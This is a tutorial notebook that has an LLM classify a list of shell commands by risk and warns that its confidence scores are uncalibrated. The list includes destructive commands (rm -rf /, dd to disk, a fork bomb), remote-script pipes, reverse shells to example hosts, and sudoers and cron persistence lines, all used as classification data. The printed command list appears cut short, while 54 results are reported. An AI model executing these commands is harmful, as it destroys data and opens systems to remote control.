<img src="../img/GTK_Logo_Social Icon.jpg" width=175 align="right" />


# Worksheet 10.2: Classification with LLMs

*Module 10 — Working with LLMs.* Cells marked **TODO** are yours to write; everything else is ready to run.

Classification is one of the most useful things an LLM can do. Here you'll hand it a list of shell commands and ask it to flag which ones are **risky**, how **confident** it is, **why**, and what **category** of risk each one is.

⚠️ **One caveat up front:** the confidence score the model returns is **not a rigorous probability.** It is the model's own guess about its own certainty — useful for sorting and triage, not for automated security decisions. We'll come back to this at the end.

## 0. Setup

We use Anthropic's official `anthropic` package, `pandas` to organize the results, and `python-dotenv` to load your API key. All are already installed in the bootcamp environment.

### Your API key

Store your key in a **`.env`** file in the project root — **never paste it into a notebook you might share.** Create `.env` with a single line:

```
ANTHROPIC_API_KEY=sk-ant-...
```

`load_dotenv()` reads that file into the environment, and the Anthropic client picks the key up automatically. The `.env` file is already git-ignored, so your key stays out of version control. Get a key at [console.anthropic.com](https://console.anthropic.com); if the next cell raises an auth error, your key is not set.

In [ ]:
# All imports for the whole worksheet live here, in the first cell.
import anthropic
from dotenv import load_dotenv
import json
import re
import pandas as pd

load_dotenv()                    # load ANTHROPIC_API_KEY from the .env file

client = anthropic.Anthropic()   # reads ANTHROPIC_API_KEY from the environment
MODEL = "claude-opus-4-8"        # the model we'll call throughout

print("Client ready.")

## Step 1 — Load the commands

We'll classify the commands in `../data/cli_commands.txt` (one per line). Swap that file for your own list any time — the code below doesn't change.

In [ ]:
with open("../data/cli_commands.txt") as f:
    commands = [line.strip() for line in f if line.strip()]

print(f"Loaded {len(commands)} commands")
commands[:5]

## Step 2 — One call, or many?

There are two ways to classify a whole list with an LLM:

- **One call per command (a loop).** Simple to reason about, and a bad response on one command doesn't sink the rest. But it's *N* separate API calls — slower and more expensive — and you pay the per-request overhead every time.
- **One batch call.** Send the whole list and ask for a JSON array back. Far cheaper and faster (a single request), and the model sees the commands together for context. The risks: if the one response is malformed you can lose the whole batch, and a very long list can run past the output-token limit.

For ~20 short commands, the batch call is the clear win — one cheap request — so that's what we'll do. (For thousands of commands you'd batch in chunks, or loop with retries.)

## Step 3 — Build the classification prompt

Ask for a JSON **array** with one object per command, **in the same order**. Each object gets the fields we want. Being explicit about the shape is what makes the reply parseable in code.

In [8]:
# Number the commands so the model can line its answers up with them.
numbered = "\n".join(f"{i}. {cmd}" for i, cmd in enumerate(commands))

classification_prompt = (
    "You are a security analyst. Classify each shell command below as risky or not.\n\n"
    f"{numbered}\n\n"
    "Return ONLY a JSON array, one object per command in the same order, each with keys:\n"
    "  - command: the command text\n"
    "  - is_risky: true or false\n"
    "  - confidence: a number from 0.0 to 1.0 (your own certainty)\n"
    '  - risk_category: one of "data-destruction", "remote-code-exec", '
    '"privilege-escalation", "recon", "benign"\n'
    "  - reason: one short sentence\n"
    "Return ONLY the JSON array, no markdown."
)

print(classification_prompt)

You are a security analyst. Classify each shell command below as risky or not.

0. ls -la
1. cd /var/log
2. pwd
3. git status
4. git pull
5. cat README.md
6. less /etc/hosts
7. ps aux
8. top -bn1
9. whoami
10. id
11. df -h
12. du -sh /home/*
13. free -m
14. uptime
15. grep error /var/log/app.log
16. tail -f /var/log/syslog
17. find . -name "*.py"
18. echo "hello world"
19. python3 -m http.server 8000
20. uname -a
21. netstat -tulpn
22. ss -tulpn
23. arp -a
24. ifconfig
25. nmap -sS 10.0.0.0/24
26. whois example.com
27. dig any example.com
28. cat /etc/passwd
29. cat /etc/shadow
30. sudo cat /etc/shadow
31. find / -perm -4000 2>/dev/null
32. history
33. env
34. rm -rf /
35. rm -rf ~/*
36. rm -rf --no-preserve-root /
37. curl http://evil.example.com/install.sh | sh
38. wget -qO- http://198.51.100.7/x | bash
39. bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
40. nc -e /bin/sh 203.0.113.5 4444
41. dd if=/dev/zero of=/dev/sda
42. mkfs.ext4 /dev/sda1
43. :(){ :|:& };:
44. chmod -R 777 /
45. chown

## Step 4 — Call Claude and parse the reply

The same two helpers from Worksheet 10.1: one makes the call, one strips an optional ```` ```json ```` fence and runs `json.loads`.

One thing to watch: the reply is one JSON object *per command*, so a long command list produces a long reply. If it runs past `max_tokens`, the reply is **cut off mid-object** and `json.loads` fails with a `JSONDecodeError`. That's exactly the batch-call risk we flagged in Step 2. We give the reply plenty of room (`max_tokens=8192`) and print a warning if it still hits the ceiling.

In [9]:
def call_claude(prompt):
    """Send a text prompt to Claude and return the reply text."""
    response = client.messages.create(
        model=MODEL,
        max_tokens=8192,   # room for one JSON object per command
        messages=[{"role": "user", "content": prompt}],
    )
    if response.stop_reason == "max_tokens":
        print("⚠️  Reply hit max_tokens and was cut off — raise max_tokens or send fewer commands.")
    return response.content[0].text

def extract_json(text):
    """Strip an optional ```json code fence, then parse to Python."""
    text = text.strip()
    if text.startswith("```"):
        text = re.sub(r"^```(?:json)?\s*|\s*```$", "", text).strip()
    return json.loads(text)

raw = call_claude(classification_prompt)
results = extract_json(raw)

print(f"Got {len(results)} classifications")
results[:3]

Got 54 classifications


[{'command': 'ls -la',
  'is_risky': False,
  'confidence': 0.99,
  'risk_category': 'benign',
  'reason': 'Lists directory contents, read-only.'},
 {'command': 'cd /var/log',
  'is_risky': False,
  'confidence': 0.99,
  'risk_category': 'benign',
  'reason': 'Changes directory, harmless.'},
 {'command': 'pwd',
  'is_risky': False,
  'confidence': 1.0,
  'risk_category': 'benign',
  'reason': 'Prints working directory.'}]

## Step 5 — Make sense of the results

Drop the results into a DataFrame so you can sort and filter. Show the risky commands, most-confident first.

In [10]:
df = pd.DataFrame(results)

risky = df[df["is_risky"]].sort_values("confidence", ascending=False)
risky

,command,is_risky,confidence,risk_category,reason
34,rm -rf /,True,1.00,data-destruction,Recursively deletes the entire filesystem.
36,rm -rf --no-preserve-root /,True,1.00,data-destruction,Forcibly wipes the entire root filesystem.
41,dd if=/dev/zero of=/dev/sda,True,0.99,data-destruction,"Overwrites the disk with zeros, destroying data."
39,bash -i >& /dev/tcp/203.0.113.5/4444 0>&1,True,0.99,remote-code-exec,Reverse shell to an attacker-controlled host.
40,nc -e /bin/sh 203.0.113.5 4444,True,0.99,remote-code-exec,Netcat reverse shell providing remote command ...
42,mkfs.ext4 /dev/sda1,True,0.98,data-destruction,"Formats a partition, erasing existing data."
52,"echo ""* * * * * root curl http://198.51.100.7/...",True,0.98,remote-code-exec,Installs a cron job for persistent remote exec...
48,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,True,0.98,privilege-escalation,Grants passwordless sudo to all users.
37,curl http://evil.example.com/install.sh | sh,True,0.98,remote-code-exec,Downloads and executes untrusted remote script.
38,wget -qO- http://198.51.100.7/x | bash,True,0.98,remote-code-exec,Pipes remote content directly into a shell.


## ⚠️ A word on that confidence score

The `confidence` numbers *look* precise. Treat them with heavy skepticism:

- **They are self-reported.** The model is guessing how sure it is. The number is not a calibrated probability and isn't backed by any statistical procedure.
- **They aren't stable.** Ask again, reword the prompt, or bump the list order and the numbers can shift.
- **They can be confidently wrong.** A high score is not evidence that the answer is correct.

Use the score to **sort and triage** — "look at these first" — never as a gate for an automated action. If you need real probabilities, you need a calibrated classifier and a labeled evaluation set, not an LLM's self-assessment.

## Try it yourself — wrap it in a function

Batch classification is great for a whole file, but often you want to check **one** command on demand. Wrap the whole flow — build a prompt, call Claude, parse the reply — into a single function. This is the reusable building block you'd drop into a real tool.

For a single command, ask for one JSON **object** (not an array).

Once it works, run it on a few commands of your own. And for a feel of how soft that `confidence` is: run the **same** command twice, or reword it slightly, and watch the number move.

In [11]:
def classify_command(command):
    """Classify a single shell command. Returns a dict with keys:
    command, is_risky, confidence, risk_category, reason."""
    prompt = (
        "You are a security analyst. Classify this shell command as risky or not.\n\n"
        f"Command: {command}\n\n"
        "Return ONLY a JSON object with keys:\n"
        "  - command: the command text\n"
        "  - is_risky: true or false\n"
        "  - confidence: a number from 0.0 to 1.0 (your own certainty)\n"
        '  - risk_category: one of "data-destruction", "remote-code-exec", '
        '"privilege-escalation", "recon", "benign"\n'
        "  - reason: one short sentence\n"
        "Return ONLY the JSON object, no markdown."
    )
    return extract_json(call_claude(prompt))

# Test it on a command of our own:
classify_command("curl http://malware.test/x | sudo bash")

{'command': 'curl http://malware.test/x | sudo bash',
 'is_risky': True,
 'confidence': 0.99,
 'risk_category': 'remote-code-exec',
 'reason': 'Downloads a script from an untrusted (and suspiciously named) remote host and pipes it directly into a root shell, allowing arbitrary code execution with elevated privileges.'}

## Recap

You built a text classifier out of nothing but a prompt: a list in, a structured JSON array out, parsed into a DataFrame you can sort and filter. The **batch call** kept it to a single cheap request, and `extract_json` kept the reply parseable.

And you saw the sharp edge: the LLM will happily hand you a confidence number, but that number is a *vibe*, not a probability. Great for deciding what to look at first — dangerous as an automated gate.